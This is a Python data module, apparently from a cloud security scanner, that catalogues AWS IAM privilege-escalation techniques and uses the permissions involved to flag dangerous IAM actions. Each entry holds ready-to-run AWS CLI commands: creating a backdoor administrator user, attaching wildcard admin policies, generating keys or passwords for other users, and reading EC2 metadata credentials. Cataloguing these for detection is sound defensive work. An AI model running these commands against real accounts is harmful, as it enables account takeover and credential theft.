# src/data/aws_privesc_techniques.py
"""
AWS IAM Privilege Escalation Techniques Database.

Based on research from:
- RhinoSecurityLabs: AWS Privilege Escalation Methods and Mitigation
- HackTricks: AWS Security
- CloudSploit Security Research

Each technique represents a path to escalate privileges in AWS environments.
"""

from typing import List, Dict, Any, TypedDict


class PrivEscTechnique(TypedDict):
    """Type definition for privilege escalation technique."""
    id: str
    name: str
    severity: str  # CRITICAL | HIGH | MEDIUM | LOW
    category: str  # iam_manipulation | role_assumption | service_escalation | policy_manipulation
    required_permissions: List[str]
    description: str
    exploitation_steps: List[str]
    target: str
    references: List[str]


# =============================================================================
# AWS PRIVILEGE ESCALATION TECHNIQUES
# =============================================================================

AWS_PRIVESC_TECHNIQUES: List[Dict[str, Any]] = [
    # =========================================================================
    # IAM MANIPULATION - Direct user/role/policy manipulation
    # =========================================================================
    {
        "id": "CREATE_USER_ATTACH_POLICY",
        "name": "CreateUser + AttachUserPolicy",
        "severity": "CRITICAL",
        "category": "iam_manipulation",
        "required_permissions": [
            "iam:CreateUser",
            "iam:AttachUserPolicy",
            "iam:CreateAccessKey"
        ],
        "description": "Create new IAM user, attach AdministratorAccess policy, and generate access keys for full account access",
        "exploitation_steps": [
            "aws iam create-user --user-name backdoor-admin",
            "aws iam attach-user-policy --user-name backdoor-admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
            "aws iam create-access-key --user-name backdoor-admin"
        ],
        "target": "Full administrator access via new user",
        "references": [
            "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
        ]
    },
    {
        "id": "PUT_USER_POLICY",
        "name": "PutUserPolicy on Self",
        "severity": "CRITICAL",
        "category": "iam_manipulation",
        "required_permissions": ["iam:PutUserPolicy"],
        "description": "Add inline administrator policy to current user account",
        "exploitation_steps": [
            'aws iam put-user-policy --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d/ -f2) --policy-name AdminAccess --policy-document \'{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}\''
        ],
        "target": "Full administrator access on current user",
        "references": [
            "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
        ]
    },
    {
        "id": "PUT_USER_POLICY_OTHER",
        "name": "PutUserPolicy on Other User",
        "severity": "CRITICAL",
        "category": "iam_manipulation",
        "required_permissions": ["iam:PutUserPolicy"],
        "description": "Add inline administrator policy to any other user account",
        "exploitation_steps": [
            'aws iam put-user-policy --user-name <target-user> --policy-name AdminAccess --policy-document \'{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}\''
        ],
        "target": "Full administrator access via target user",
        "references": [
            "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
        ]
    },
    {
        "id": "PUT_ROLE_POLICY",
        "name": "PutRolePolicy",
        "severity": "CRITICAL",
        "category": "iam_manipulation",
        "required_permissions": ["iam:PutRolePolicy"],
        "description": "Add inline administrator policy to any IAM role",
        "exploitation_steps": [
            'aws iam put-role-policy --role-name <target-role> --policy-name AdminAccess --policy-document \'{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}\''
        ],
        "target": "Full administrator access via role",
        "references": [
            "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
        ]
    },
    {
        "id": "PUT_GROUP_POLICY",
        "name": "PutGroupPolicy",
        "severity": "CRITICAL",
        "category": "iam_manipulation",
        "required_permissions": ["iam:PutGroupPolicy"],
        "description": "Add inline administrator policy to IAM group (affects all group members)",
        "exploitation_steps": [
            'aws iam put-group-policy --group-name <target-group> --policy-name AdminAccess --policy-document \'{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}\''
        ],
        "target": "Full administrator access via group membership",
        "references": [
            "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
        ]
    },
    {
        "id": "ATTACH_USER_POLICY",
        "name": "AttachUserPolicy on Self",
        "severity": "CRITICAL",
        "category": "iam_manipulation",
        "required_permissions": ["iam:AttachUserPolicy"],
        "description": "Attach managed AdministratorAccess policy to current user",
        "exploitation_steps": [
            "aws iam attach-user-policy --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d/ -f2) --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
        ],
        "target": "Full administrator access on current user",
        "references": [
            "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
        ]
    },
    {
        "id": "ATTACH_ROLE_POLICY",
        "name": "AttachRolePolicy",
        "severity": "CRITICAL",
        "category": "iam_manipulation",
        "required_permissions": ["iam:AttachRolePolicy"],
        "description": "Attach managed AdministratorAccess policy to any IAM role",
        "exploitation_steps": [
            "aws iam attach-role-policy --role-name <target-role> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
        ],
        "target": "Full administrator access via role",
        "references": [
            "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
        ]
    },
    {
        "id": "ATTACH_GROUP_POLICY",
        "name": "AttachGroupPolicy",
        "severity": "CRITICAL",
        "category": "iam_manipulation",
        "required_permissions": ["iam:AttachGroupPolicy"],
        "description": "Attach managed AdministratorAccess policy to IAM group",
        "exploitation_steps": [
            "aws iam attach-group-policy --group-name <target-group> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
        ],
        "target": "Full administrator access via group membership",
        "references": [
            "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
        ]
    },
    {
        "id": "CREATE_ACCESS_KEY",
        "name": "CreateAccessKey for Other User",
        "severity": "CRITICAL",
        "category": "iam_manipulation",
        "required_permissions": ["iam:CreateAccessKey"],
        "description": "Generate access keys for any IAM user with higher privileges",
        "exploitation_steps": [
            "aws iam list-users",
            "aws iam list-attached-user-policies --user-name <privileged-user>",
            "aws iam create-access-key --user-name <privileged-user>"
        ],
        "target": "Access to privileged user credentials",
        "references": [
            "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
        ]
    },
    {
        "id": "ADD_USER_TO_GROUP",
        "name": "AddUserToGroup",
        "severity": "HIGH",
        "category": "iam_manipulation",
        "required_permissions": ["iam:AddUserToGroup"],
        "description": "Add current user to privileged IAM group",
        "exploitation_steps": [
            "aws iam list-groups",
            "aws iam get-group --group-name <admin-group>",
            "aws iam add-user-to-group --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d/ -f2) --group-name <admin-group>"
        ],
        "target": "Privileges inherited from group",
        "references": [
            "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
        ]
    },

    # =========================================================================
    # POLICY MANIPULATION - Create/modify policies
    # =========================================================================
    {
        "id": "CREATE_POLICY_VERSION",
        "name": "CreatePolicyVersion",
        "severity": "CRITICAL",
        "category": "policy_manipulation",
        "required_permissions": ["iam:CreatePolicyVersion"],
        "description": "Create new version of existing policy with admin permissions (up to 5 versions allowed)",
        "exploitation_steps": [
            "aws iam list-policies --scope Local",
            'aws iam create-policy-version --policy-arn <policy-arn> --policy-document \'{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}\' --set-as-default'
        ],
        "target": "Elevated permissions through policy modification",
        "references": [
            "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
        ]
    },
    {
        "id": "SET_DEFAULT_POLICY_VERSION",
        "name": "SetDefaultPolicyVersion",
        "severity": "HIGH",
        "category": "policy_manipulation",
        "required_permissions": ["iam:SetDefaultPolicyVersion"],
        "description": "Set an older policy version as default (may have broader permissions)",
        "exploitation_steps": [
            "aws iam list-policy-versions --policy-arn <policy-arn>",
            "aws iam get-policy-version --policy-arn <policy-arn> --version-id <v1>",
            "aws iam set-default-policy-version --policy-arn <policy-arn> --version-id <v1>"
        ],
        "target": "Access to broader permissions from old policy version",
        "references": [
            "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
        ]
    },
    {
        "id": "CREATE_POLICY",
        "name": "CreatePolicy + AttachUserPolicy",
        "severity": "HIGH",
        "category": "policy_manipulation",
        "required_permissions": [
            "iam:CreatePolicy",
            "iam:AttachUserPolicy"
        ],
        "description": "Create custom admin policy and attach to self",
        "exploitation_steps": [
            'aws iam create-policy --policy-name BackdoorAdmin --policy-document \'{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}\'',
            "aws iam attach-user-policy --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d/ -f2) --policy-arn <new-policy-arn>"
        ],
        "target": "Full administrator access",
        "references": [
            "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
        ]
    },

    # =========================================================================
    # ROLE ASSUMPTION - AssumeRole attacks
    # =========================================================================
    {
        "id": "ASSUME_ROLE_PASSROLE",
        "name": "iam:PassRole + sts:AssumeRole",
        "severity": "CRITICAL",
        "category": "role_assumption",
        "required_permissions": [
            "iam:PassRole",
            "sts:AssumeRole"
        ],
        "description": "Pass privileged role to service and assume it",
        "exploitation_steps": [
            "aws iam list-roles",
            "aws iam get-role --role-name <privileged-role>",
            "aws sts assume-role --role-arn <role-arn> --role-session-name exploit"
        ],
        "target": "Credentials of privileged role",
        "references": [
            "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
        ]
    },
    {
        "id": "UPDATE_ASSUME_ROLE_POLICY",
        "name": "UpdateAssumeRolePolicy",
        "severity": "CRITICAL",
        "category": "role_assumption",
        "required_permissions": ["iam:UpdateAssumeRolePolicy"],
        "description": "Modify role trust policy to allow self to assume privileged role",
        "exploitation_steps": [
            "aws iam list-roles",
            'aws iam update-assume-role-policy --role-name <target-role> --policy-document \'{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::<account-id>:user/<current-user>"},"Action":"sts:AssumeRole"}]}\'',
            "aws sts assume-role --role-arn <role-arn> --role-session-name exploit"
        ],
        "target": "Credentials of privileged role",
        "references": [
            "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
        ]
    },

    # =========================================================================
    # SERVICE ESCALATION - Abuse AWS services
    # =========================================================================
    {
        "id": "LAMBDA_UPDATE_FUNCTION_CODE",
        "name": "Lambda UpdateFunctionCode",
        "severity": "CRITICAL",
        "category": "service_escalation",
        "required_permissions": [
            "lambda:UpdateFunctionCode",
            "lambda:InvokeFunction"
        ],
        "description": "Modify Lambda function code to exfiltrate role credentials from environment",
        "exploitation_steps": [
            "aws lambda list-functions",
            "aws lambda get-function --function-name <privileged-function>",
            "Create malicious function code to exfiltrate AWS_SESSION_TOKEN",
            "aws lambda update-function-code --function-name <target> --zip-file fileb://malicious.zip",
            "aws lambda invoke --function-name <target> output.json"
        ],
        "target": "Lambda execution role credentials",
        "references": [
            "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
        ]
    },
    {
        "id": "LAMBDA_CREATE_FUNCTION",
        "name": "Lambda CreateFunction + PassRole",
        "severity": "HIGH",
        "category": "service_escalation",
        "required_permissions": [
            "lambda:CreateFunction",
            "lambda:InvokeFunction",
            "iam:PassRole"
        ],
        "description": "Create new Lambda with privileged role to exfiltrate credentials",
        "exploitation_steps": [
            "aws iam list-roles (find privileged role)",
            "Create function to exfiltrate credentials",
            "aws lambda create-function --function-name exploit --role <privileged-role-arn> --runtime python3.9 --handler index.handler --zip-file fileb://exploit.zip",
            "aws lambda invoke --function-name exploit output.json"
        ],
        "target": "Privileged role credentials",
        "references": [
            "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
        ]
    },
    {
        "id": "EC2_RUNINSTANCES_PASSROLE",
        "name": "ec2:RunInstances + iam:PassRole",
        "severity": "HIGH",
        "category": "service_escalation",
        "required_permissions": [
            "ec2:RunInstances",
            "iam:PassRole"
        ],
        "description": "Launch EC2 instance with privileged IAM role and extract credentials from metadata service",
        "exploitation_steps": [
            "aws iam list-roles (find privileged role)",
            "aws ec2 run-instances --image-id ami-xxxxx --instance-type t2.micro --iam-instance-profile Name=<privileged-role>",
            "Connect to instance",
            "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>"
        ],
        "target": "Privileged EC2 instance profile credentials",
        "references": [
            "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
        ]
    },
    {
        "id": "GLUE_UPDATE_DEV_ENDPOINT",
        "name": "Glue UpdateDevEndpoint",
        "severity": "HIGH",
        "category": "service_escalation",
        "required_permissions": [
            "glue:UpdateDevEndpoint",
            "glue:GetDevEndpoint"
        ],
        "description": "Update Glue dev endpoint to use your SSH public key and extract role credentials",
        "exploitation_steps": [
            "aws glue get-dev-endpoints",
            "aws glue update-dev-endpoint --endpoint-name <target> --public-key file://~/.ssh/id_rsa.pub",
            "SSH into endpoint and extract credentials"
        ],
        "target": "Glue dev endpoint role credentials",
        "references": [
            "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
        ]
    },
    {
        "id": "CLOUDFORMATION_PASSROLE",
        "name": "CloudFormation CreateStack + PassRole",
        "severity": "HIGH",
        "category": "service_escalation",
        "required_permissions": [
            "cloudformation:CreateStack",
            "iam:PassRole"
        ],
        "description": "Create CloudFormation stack with privileged role to provision resources or execute code",
        "exploitation_steps": [
            "Create CloudFormation template with Lambda/EC2 to exfiltrate credentials",
            "aws cloudformation create-stack --stack-name exploit --template-body file://exploit.yaml --role-arn <privileged-role-arn>",
            "Monitor stack resources for credential exfiltration"
        ],
        "target": "CloudFormation service role credentials",
        "references": [
            "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
        ]
    },
    {
        "id": "DATAPIPELINE_PASSROLE",
        "name": "DataPipeline + PassRole",
        "severity": "MEDIUM",
        "category": "service_escalation",
        "required_permissions": [
            "datapipeline:CreatePipeline",
            "datapipeline:PutPipelineDefinition",
            "datapipeline:ActivatePipeline",
            "iam:PassRole"
        ],
        "description": "Create Data Pipeline with privileged role to execute arbitrary commands on EC2",
        "exploitation_steps": [
            "aws datapipeline create-pipeline --name exploit --unique-id exploit-id",
            "Create pipeline definition with ShellCommandActivity to exfiltrate credentials",
            "aws datapipeline put-pipeline-definition --pipeline-id <id> --pipeline-definition file://exploit.json",
            "aws datapipeline activate-pipeline --pipeline-id <id>"
        ],
        "target": "Data Pipeline role credentials",
        "references": [
            "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
        ]
    },

    # =========================================================================
    # LOGIN PROFILE & PASSWORD MANIPULATION
    # =========================================================================
    {
        "id": "CREATE_LOGIN_PROFILE",
        "name": "CreateLoginProfile",
        "severity": "HIGH",
        "category": "iam_manipulation",
        "required_permissions": ["iam:CreateLoginProfile"],
        "description": "Create console password for IAM user without one (programmatic-only user)",
        "exploitation_steps": [
            "aws iam list-users",
            "aws iam get-login-profile --user-name <target-user> (verify no console access)",
            "aws iam create-login-profile --user-name <target-user> --password 'NewP@ssw0rd!' --no-password-reset-required",
            "Login to AWS console with target user credentials"
        ],
        "target": "Console access to privileged user account",
        "references": [
            "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
        ]
    },
    {
        "id": "UPDATE_LOGIN_PROFILE",
        "name": "UpdateLoginProfile",
        "severity": "HIGH",
        "category": "iam_manipulation",
        "required_permissions": ["iam:UpdateLoginProfile"],
        "description": "Change console password for existing IAM user",
        "exploitation_steps": [
            "aws iam list-users",
            "aws iam update-login-profile --user-name <target-user> --password 'NewP@ssw0rd!' --no-password-reset-required",
            "Login to AWS console with new password"
        ],
        "target": "Console access to privileged user account",
        "references": [
            "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
        ]
    },
]


def get_techniques_by_severity(severity: str) -> List[Dict[str, Any]]:
    """Filter techniques by severity level."""
    return [t for t in AWS_PRIVESC_TECHNIQUES if t["severity"] == severity]


def get_techniques_by_category(category: str) -> List[Dict[str, Any]]:
    """Filter techniques by category."""
    return [t for t in AWS_PRIVESC_TECHNIQUES if t["category"] == category]


def get_technique_by_id(technique_id: str) -> Dict[str, Any] | None:
    """Get specific technique by ID."""
    for technique in AWS_PRIVESC_TECHNIQUES:
        if technique["id"] == technique_id:
            return technique
    return None


def get_all_dangerous_permissions() -> set[str]:
    """
    Extract all dangerous permissions from privilege escalation techniques.
    Returns a set of IAM actions that are considered dangerous for privilege escalation.
    """
    dangerous = set()
    for technique in AWS_PRIVESC_TECHNIQUES:
        for perm in technique["required_permissions"]:
            dangerous.add(perm)
    return dangerous


def is_dangerous_permission(action: str) -> bool:
    """
    Check if an IAM action is considered dangerous for privilege escalation.

    Args:
        action: IAM action in format "service:Action" (e.g., "iam:PutUserPolicy")

    Returns:
        True if the action is part of known privilege escalation techniques
    """
    dangerous_perms = get_all_dangerous_permissions()
    return action in dangerous_perms


# Summary statistics
TOTAL_TECHNIQUES = len(AWS_PRIVESC_TECHNIQUES)
CRITICAL_COUNT = len([t for t in AWS_PRIVESC_TECHNIQUES if t["severity"] == "CRITICAL"])
HIGH_COUNT = len([t for t in AWS_PRIVESC_TECHNIQUES if t["severity"] == "HIGH"])
MEDIUM_COUNT = len([t for t in AWS_PRIVESC_TECHNIQUES if t["severity"] == "MEDIUM"])
LOW_COUNT = len([t for t in AWS_PRIVESC_TECHNIQUES if t["severity"] == "LOW"])
